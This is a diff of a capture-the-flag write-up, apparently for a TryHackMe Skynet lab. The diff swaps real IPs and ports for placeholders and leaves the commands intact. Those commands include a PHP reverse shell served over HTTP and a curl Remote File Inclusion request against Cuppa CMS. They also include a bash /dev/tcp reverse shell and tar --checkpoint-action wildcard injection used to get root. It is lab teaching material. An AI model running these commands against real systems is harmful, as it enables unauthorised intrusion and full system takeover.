@@ -95,20 +95,20 @@ cp /opt/lists/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php /worksp
 we edit the file to put our tun0 IP and port 4444
 
 ```
-sed -i "s/127.0.0.1/192.168.223.161/" /workspace/shell.php
-sed -i "s/CHANGETHIS/192.168.223.161/" /workspace/shell.php
+sed -i "s/127.0.0.1/<IP>/" /workspace/shell.php
+sed -i "s/<PORT>/<IP>/" /workspace/shell.php
 ```
 
 then we start a http server to host the shell
 
 ```
-python3 -m http.server 8888
+python3 -m http.server <PORT>
 ```
 
 we start our listener in another terminal
 
 ```
-nc -lvnp 4444
+nc -lvnp <PORT>
 ```
 
 and we trigger the RFI
@@ -116,7 +116,7 @@ and we trigger the RFI
 the file `alertConfigField.php` in Cuppa CMS has a parameter called `urlConfig` that is supposed to load a local config file, but it doesn't sanitize the input at all. It just takes whatever URL you give it and includes it directly with PHP. So instead of giving it a local file, we give it a remote URL pointing to our machine — that's the **Remote File Inclusion (RFI)**. The target server fetches our `shell.php` from our http server (port 8888) and executes it as PHP on its side. Inside `shell.php` there's a reverse connection back to our listener (port 4444). So two things happen: port 8888 serves the file, port 4444 receives the shell.
 
 ```
-curl "http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.223.161:8888/shell.php"
+curl "http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<IP>:<PORT>/shell.php"
 ```
 
 and we got a shell as **www-data**
@@ -147,7 +147,7 @@ so we create our payload in `/var/www/html`
 
 ```
 cd /var/www/html
-printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.223.161/5555 0>&1\n' > shell.sh
+printf '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1\n' > shell.sh
 chmod +x shell.sh
 touch -- "--checkpoint=1"
 touch -- "--checkpoint-action=exec=bash shell.sh"
@@ -156,7 +156,7 @@ touch -- "--checkpoint-action=exec=bash shell.sh"
 we start a new listener
 
 ```
-nc -lvnp 5555
+nc -lvnp <PORT>
 ```
 
 we wait about 1 minute and we get a shell as **root**
